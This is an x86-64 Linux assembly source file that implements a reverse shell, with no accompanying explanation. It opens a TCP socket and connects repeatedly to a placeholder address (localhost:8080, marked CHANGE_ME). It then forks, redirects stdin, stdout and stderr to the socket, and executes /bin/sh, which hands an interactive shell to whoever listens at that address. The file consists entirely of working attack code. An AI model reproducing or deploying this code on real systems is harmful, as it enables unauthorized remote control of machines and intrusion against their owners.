struc sockaddr_in
    .sin_family resw 1
    .sin_port resw 1
    .sin_addr resd 1
    .sin_zero resb 8
endstruc

section .rodata
    sockaddr istruc sockaddr_in
        at sockaddr_in.sin_family, dw 2         ; AF_INET
        at sockaddr_in.sin_port, dw 0x901F      ; 8080 (CHANGE_ME)
        at sockaddr_in.sin_addr, dd 0x0100007F  ; localhost (CHANGE_ME)
        at sockaddr_in.sin_zero, dd 0, 0        ; 0
    iend
    sockaddr_in_size equ $ - sockaddr

    shell db "/bin/sh", 0

section .text
    global _start

_start:
    mov rax, 0x29                   ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    mov rdi, 2                      ; AF_INET
    mov rsi, 1                      ; SOCK_STREAM
    mov rdx, 6                      ; IPPROTO_TCP
    syscall

    mov rbx, rax                    ; sock

_connect:
    mov rax, 0x2A                   ; connect(sock, (sockaddr*)&sockaddr_in, sizeof(sockaddr_in))
    mov rdi, rbx                    ; sock
    lea rsi, [sockaddr]             ; (sockaddr*)&sockaddr_in
    mov rdx, sockaddr_in_size       ; sizeof(sockaddr_in)
    syscall

    cmp rax, 0x00
    jl _connect

    mov rax, 0x39                   ; fork()
    syscall

    cmp rax, -1
    je _end

    mov rax, 0x21                   ; dup2(oldfd, newfd)
    mov rdi, rbx                    ; sock
    xor rsi, rsi                    ; STDIN
    syscall

    mov rax, 0x21                   ; dup2(oldfd, newfd)
    mov rdi, rbx                    ; sock
    mov rsi, 0x01                   ; STDOUT
    syscall

    mov rax, 0x21                   ; dup2(oldfd, newfd)
    mov rdi, rbx                    ; sock
    mov rsi, 0x02                   ; STDERR
    syscall

    mov rax, 0x3B                   ; execve("/bin/sh", NULL, NULL)
    lea rdi, [shell]                ; "/bin/sh"
    xor rsi, rsi                    ; NULL
    xor rdx, rdx                    ; NULL
    syscall

_end:
    mov rax, 0x03                   ; close(sock)
    mov rdi, rbx                    ; sock
    syscall

    mov rax, 0x3C                   ; exit(0)
    mov rdi, 0x00                   ; 0
    syscall
